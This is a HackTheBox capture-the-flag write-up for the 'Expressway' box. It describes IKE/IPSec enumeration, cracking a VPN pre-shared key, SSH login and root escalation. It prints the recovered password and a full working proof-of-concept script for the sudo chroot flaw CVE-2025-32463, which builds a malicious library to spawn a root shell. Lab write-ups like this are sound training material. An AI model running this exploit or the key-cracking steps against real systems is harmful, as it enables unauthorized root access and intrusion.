---
layout: post
title: HTB-Expressway
date: 2025-09-24
tags: [HTB]
category: [CTF-Writeups]
---

# HTB — Expressway: Quick Writeup

**IP:** `10.129.182.76`  
**Difficulty:** Easy  
**Skills:** IKE/IPSec enumeration • PSK cracking • SSH access • sudo exploit (CVE-2025-32463)

> **Summary:** Only SSH (22) was exposed, but an IKE service on UDP/500 was discovered via UDP scan. Using `ike-scan` produced a PSK candidate file and an associated email (`ike@expressway.htb`). Cracking the PSK revealed `freakingrockstarontheroad`, allowing SSH access as `ike` to capture the user flag. Root was obtained by exploiting a critical Sudo chroot vulnerability (CVE-2025-32463) using a public PoC to spawn a root shell and read `root.txt`.

---

## Table of contents
1. [Recon (nmap & UDP scan)](#recon-nmap--udp)  
2. [User: IKE discovery & PSK cracking](#user)  
3. [Root: CVE-2025-32463 Sudo chroot exploit](#root)  
4. [Flags](#flags)  

---

## Recon (nmap & UDP)

**Command used**

```bash
nmap 10.129.182.76
```

**Result**

```text
PORT   STATE SERVICE
22/tcp open  ssh
```

A UDP scan (rustscan) revealed an open UDP port:

```text
rustscan --udp -a 10.129.182.76
Open 10.129.182.76:500
```

Port 500/udp commonly hosts IKE/IPSec (VPN) — proceed to enumerate with `ike-scan`.

---

## User

### Steps
1. Run `ike-scan` to enumerate and capture PSK candidate information:

```bash
ike-scan -A --trans=5,2,1,2 --id=vpnclient -P psk.txt 10.129.182.76
```

This produces `psk.txt` containing potential pre-shared key material gathered from the IKE handshake.

2. Crack the PSK using a wordlist (example: `rockyou.txt`) with the `psk-crack` tool:

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt psk.txt
```

3. Recovered PSK:
```
freakingrockstarontheroad
```


4. `ike-scan` output also revealed an email address associated with the endpoint: `ike@expressway.htb`.

5. SSH in as the discovered user:

```bash
ssh ike@10.129.182.76
# password: freakingrockstarontheroad
```

6. Retrieve the user flag:

```bash
cat /home/ike/user.txt
# dOtHisYoUrSeLf
```

---

## Root

### Discovery
Check sudo and its version:

```bash
sudo -V
```

Sudo reported version `1.9.17`. A public advisory and PoC exist for **CVE-2025-32463** — a critical Sudo chroot privilege escalation (often referred to as the "chwoot" / chroot bypass PoC). Verify whether `sudo -R` accepts a chroot replacement string:

```bash
sudo -R woot woot
```

If the error returned is:
```
sudo: woot: No such file or directory
```


then the binary accepts the `-R` (root directory) option in a way that can be abused by the published exploit — indicating the target is likely vulnerable and the public PoC should work.

### Exploit (PoC)
A working PoC was available at the referenced public repo (trimmed to essential parts here). The exploit compiles a small shared object that runs code at library init time, crafts a fake chroot layout, and invokes `sudo -R` to trigger execution as root.

```bash
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

if [ $# -eq 0 ]; then
    # If no command is provided, default to an interactive root shell.
    CMD="/bin/bash"
else
    # Otherwise, use the provided arguments as the command to execute.
    CMD="$@"
fi

# Escape the command to safely include it in a C string literal.
# This handles backslashes and double quotes.
CMD_C_ESCAPED=$(printf '%s' "$CMD" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g')

cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/sh", "sh", "-c", "${CMD_C_ESCAPED}", NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
sudo -R woot woot
rm -rf ${STAGE?}
```

**Usage notes**

- Run the PoC on the target as the unprivileged user that has the vulnerable `sudo` behavior (in this case, `ike`).
- The PoC, when successful, spawns a root shell (or runs the provided command) due to the `setreuid(0,0)` performed by the injected constructor.
- After gaining a shell as root, read the root flag:

```bash
cat /root/root.txt
# dOtHisYoUrSeLf
```

---

## Flags

- **User:** `dOtHisYoUrSeLf`  
- **Root:** `dOtHisYoUrSeLf`

---

*This writeup documents a CTF box and is for educational purposes only. Do not perform these actions against systems you do not own or have permission to test.*
